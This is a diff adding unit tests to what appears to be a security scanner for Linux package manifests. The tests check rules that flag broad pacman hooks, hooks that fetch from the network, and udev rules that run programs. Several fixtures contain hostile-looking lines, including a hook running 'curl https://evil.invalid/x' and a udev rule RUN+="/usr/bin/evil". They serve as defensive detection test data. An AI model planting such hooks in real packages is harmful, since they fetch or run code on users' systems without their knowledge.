@@ -186,3 +186,45 @@ def test_a014_allows_origin_relative_runpath():
 def test_a015_flags_a_packed_binary():
     manifest = [{"path": "/usr/bin/app", "elf": {"packed": True}}]
     assert "A015" in _ids(manifest)
+
+
+def test_a011_fires_on_a_broad_hook_with_an_exec():
+    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
+                 "content": "[Trigger]\nOperation = *\nExec = /usr/bin/foo\n"}]
+    assert "A011" in _ids(manifest)
+
+
+def test_a011_does_not_fire_on_a_specific_operation():
+    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
+                 "content": "[Trigger]\nOperation = Install\nExec = /usr/bin/foo\n"}]
+    assert "A011" not in _ids(manifest)
+
+
+def test_a012_fires_on_a_fetch_in_a_hook():
+    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
+                 "content": "[Trigger]\nOperation = Install\n"
+                            "Exec = /usr/bin/curl https://evil.invalid/x\n"}]
+    assert "A012" in _ids(manifest)
+
+
+def test_a012_does_not_fire_on_a_plain_exec():
+    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
+                 "content": "[Trigger]\nOperation = Install\nExec = /usr/bin/foo\n"}]
+    assert "A012" not in _ids(manifest)
+
+
+def test_a013_fires_on_a_udev_program():
+    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
+                 "content": 'ACTION=="add", RUN+="/usr/bin/evil"\n'}]
+    assert "A013" in _ids(manifest)
+
+
+def test_a013_does_not_fire_on_a_symlink_only_rule():
+    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
+                 "content": 'ACTION=="add", SYMLINK+="x"\n'}]
+    assert "A013" not in _ids(manifest)
+
+
+def test_content_beyond_the_cap_is_not_scanned():
+    content = "x" * (64 * 1024) + " curl https://evil.invalid/x"
+    assert "A012" not in _ids([{"path": "/etc/x.hook", "content": content}])
